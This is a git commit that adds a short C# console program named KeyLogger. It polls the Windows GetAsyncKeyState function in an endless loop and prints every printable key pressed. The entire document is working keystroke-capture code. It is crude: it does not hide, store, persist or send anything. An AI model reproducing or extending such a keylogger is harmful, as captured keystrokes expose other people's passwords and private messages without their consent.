0370cec942f44726c392c67d173fa00053e38a74
Giacomo Corallini <corallinigiacomo89@gmail.com>
2020-09-12 16:52:45 +0200

    first commit

---
+++ KeyLogger/Program.cs
@@ -0,0 +1,33 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+namespace KeyLogger
+{
+    class Program
+    {
+        [DllImport("User32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
+
+        static void Main(string[] args)
+        {
+            while (true)
+            {
+                Thread.Sleep(20);
+
+                for (int i = 32; i < 127; i++)
+                {
+                    int keystate = GetAsyncKeyState(i);
+                    if (keystate != 0)
+                    {
+                        if (keystate == 32768)
+                        {
+                        Console.Write((char) i + ", ");
+                        }
+                    }
+                }
+            }
+        }
+
+    }
+}
